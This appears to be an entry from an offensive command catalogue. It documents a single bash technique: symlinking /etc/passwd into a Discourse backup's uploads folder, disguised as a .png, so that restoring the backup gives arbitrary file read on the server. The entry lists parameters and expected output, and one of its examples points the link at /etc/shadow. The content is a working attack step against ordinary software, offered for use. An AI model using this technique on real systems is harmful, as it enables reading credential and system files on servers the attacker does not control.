---
data: >-
  ln -s /etc/passwd
  /home/symlink/files/uploads/default/original/1X/7ad2e8f5fe02890f20503044b604e29e6f3718fd.png
tags:
  - symlink
  - file-link
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:18.602Z'
id: a5991c6f-f834-4103-b686-1c7d3d59a9b9
verified: false
validated: true
submitted: true
---
# create-symlink-to-sensitive-file

## Command

```bash
ln -s /etc/passwd /home/symlink/files/uploads/default/original/1X/7ad2e8f5fe02890f20503044b604e29e6f3718fd.png
```

## Description

Creates a symbolic link from a sensitive system file (/etc/passwd) to a location within a Discourse backup's uploads directory, masquerading as an image file to bypass validation during restore and enable arbitrary file read.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Specifies symbolic (soft) link creation | Yes |
| `/etc/passwd` | Target file path to link to (change for other files) | Yes |
| `/home/symlink/files/uploads/default/original/1X/7ad2e8f5fe02890f20503044b604e29e6f3718fd.png` | Destination path and filename in backup structure | Yes |

## Examples

### Basic Usage

```bash
ln -s /etc/passwd ./fake_image.png
```

### Advanced Usage

```bash
ln -s /etc/shadow /path/to/uploads/1X/long_hash.txt
```

## Expected Output

No stdout if successful; use `ls -l` to verify: lrwxrwxrwx 1 user user 10 Oct 1 12:00 fake_image.png -> /etc/passwd. Errors if target inaccessible or permissions denied.

## Related

- [[Related Procedure|procedures/Modify-Backup-with-Symlink]]
